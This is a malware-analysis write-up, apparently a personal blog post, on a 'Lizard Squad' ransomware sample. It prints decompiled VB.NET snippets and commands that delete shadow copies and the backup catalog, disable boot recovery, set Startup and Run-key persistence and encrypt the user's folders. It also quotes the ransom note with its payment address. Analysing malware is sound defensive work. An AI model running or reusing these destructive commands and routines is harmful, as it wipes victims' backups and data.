# Analysis Lizard Squad Ransomware 


[Twitter](https://twitter.com/patri1ck)


Hello Guys ,Today We Will Analysis Ransomware Sample That I Found On Twitter Account [Tweet](https://twitter.com/petrovic082/status/1546833472353968129?s=21) 

Let's Dive Into It 

## Functions 
- [Delete Shadow Copies](#Delete-Shadow-Copies:)
- [Disable Recovery Mode](#Disable-Recovery-Mode:)
- [Delete Backup Catalog](#Delete-Backup-Catalog:)
- [Add Link To Startup](#Add-Link-To-Startup:)
- [Registry Startup](#Registry-Startup:)
- [look For Directories](#look-For-Directories:)
- [Set Wallpaper](#Set-Wallpaper:)
- [Add And Open Note](#Add-And-Open-Note:)

## Delete Shadow Copies:
    Will Execute This Command :
        "vssadmin delete shadows /all /quiet & wmic shadowcopy delete"
    For Delete Shadows copies
<details>
    <summary>Code (click to expand/collapse)</summary>

```vb
Private Shared Sub DeleteShadowCopies()
    Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete")
End Sub
```

</details>

## Disable Recovery Mode:
    Will Execute This Command :
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"
	to Disable Recovery Mode This Command will Not Allow To The Victim To Use The Recovery Mode 
<details>
    <summary>Code (click to expand/collapse)</summary>

Private Shared Sub DisableRecoveryMode()
    Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no")
End Sub
</details>

## Delete Backup Catalog:
	Will Execute This Command :
		"wbadmin delete catalog -quiet"
	To Delete BackUp Catalog 
<details>
    <summary>Code (click to expand/collapse)</summary>

Private Shared Sub DisableRecoveryMode()
    Program.runCommand("wbadmin delete catalog -quiet")
End Sub

</details>

## Add Link To Startup:
    Make lnk File in startup 
	For persistence
<details>
    <summary>Code (click to expand/collapse)</summary>
Private Shared Sub AddLinkToStartup()
	Dim folderPath As String = Enviroment.GetFolderPath(Enviroment.SpecialFolder.Startup)
	Dim str As String = Process.GetCurrentProcess().ProcessName
	Using streamWriter As StreamWriter = New StreamWriter(folderPath + "\" + str + ".url")
		Dim location As String = Assembly.GetExecutingAssembly().location
		streamWriter.WriteLine("[InternetShortcut]")
		streamWriter.WriteLine("URL=file:///"+location)
		streamWriter.WriteLine("iconIndex=0")
		Dim str2 As String = location.Replace("\"c,"/"c)
		streamWriter.WriteLine("IconFile=" + str2)
		End Using
End Sub

</details>

## Registry Startup:
    Set Registry Name Value "Microsoft Store" And Will Set Registry Value Data to The RansomWare Path 
	The Key :
		"HKCU/SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	To Do persistence
## look For Directories:
	This Function Will Look For Directories And Encrypted It
	The List Of The Directories as Saved As String With User Main Dir 
- Desktop
- Links
- Contacts
- Documents
- Downloads
- Pictures
- Music
- OneDrive
- Saved Games
- Favorites
- Searches
- Videos

<details>
    <summary>Code (click to expand/collapse)</summary>

Dim location As String = Program.userDir + Program.userName + "\Desktop"
Dim location2 As String = Program.userDir + Program.userName + "\Links"
Dim location3 As String = Program.userDir + Program.userName + "\Contacts"
Dim location4 As String = Program.userDir + Program.userName + "\Desktop"
Dim location5 As String = Program.userDir + Program.userName + "\Documents"
Dim location6 As String = Program.userDir + Program.userName + "\Downloads"
Dim location7 As String = Program.userDir + Program.userName + "\Pictures"
Dim location8 As String = Program.userDir + Program.userName + "\Music"
Dim location9 As String = Program.userDir + Program.userName + "\OneDrive"
Dim location10 As String = Program.userDir + Program.userName + "\Saved Games"
Dim location11 As String = Program.userDir + Program.userName + "\Favorites"
Dim location12 As String = Program.userDir + Program.userName + "\Searches"
Dim location13 As String = Program.userDir + Program.userName + "\Videos"
Program.encryptDirectory(location)
Program.encryptDirectory(location2)
Program.encryptDirectory(location3)
Program.encryptDirectory(location4)
Program.encryptDirectory(location5)
Program.encryptDirectory(location6)
Program.encryptDirectory(location7)
Program.encryptDirectory(location8)
Program.encryptDirectory(location9)
Program.encryptDirectory(location10)
Program.encryptDirectory(location11)
Program.encryptDirectory(location12)
Program.encryptDirectory(location13) 
## !Dump! He Could Do It With For Loop !
</details>

## Set Wallpaper:
    This func Will Change The Wallpaper
	To This Image :
[![N|Solid](https://pbs.twimg.com/media/FXd016dXoAYn99q?format=jpg&name=small)
<details>
    <summary>Code (click to expand/collapse)</summary>

Public Shared Sub SetWallpaper(base64 As string)
  if base64 <> "" Then
    Try
      Dim text As String = Path.GetTempPath() + Program.RandomString(9) + ".jpg"
      File.WriteAllBytes(text,Convert.FromBase64String(base64))
      Program.SystemParametersInfo(20UI, 0UI,text,1UI)
    Catch
    End Try
  End If
End Sub

</details>
	
## Add And Open Note:
    This Function Will Write Message For Victim
	The Name Of a File "說明it.txt" 
	And The Message :
	"我來自一個名為：蜥蜴小隊的國際組織", "我們是黑客組織", "我的名字是：09先生", "我會用你的電腦作為收款的抵押品", "", "請支付：USDT-TRC20", "金額：2000", "付款地址：TRZRAM9KL5qv1BMrXxo876wetHfzT19sii", "聯繫方式 ：woo090909@mail2tor.com", "電報：@woo090909", "付款後聯繫我，我會為你解鎖", "如果您不付款，您的計算機和文件將被自動銷毀，", "如果你真的想解決，請隨時支付費用，聯繫我，我會考慮給你打折", 
	"I'm from an international organization called: Lizard Squad , we are a hacker group , My name is: Mr. 09 , I will use your computer as collateral for collection , Please pay: USDT-TRC20 , Amount: 2000 , Payment address: TRZRAM9KL5qv1BMrXxo876wetHfzT19sii , contact details : woo090909@mail2tor.com , telegraph: @woo090909 , Contact me after payment and I will unlock it for you , If you do not pay, your computer and files will be automatically destroyed , If you really want a fix, feel free to pay the fee, contact me and I'll consider giving you a discount" 
Hmmm , The Name Of The Group Looks Familiar To Me :
	https://en.wikipedia.org/wiki/Lizard_Squad

> it seems To me The Ransomware Has Been Built By Ransomware Builder Because I Found It In The source Code , there are Functions Not Used By The Ransomware Sample That I Have And I See Settings Strings Not Used


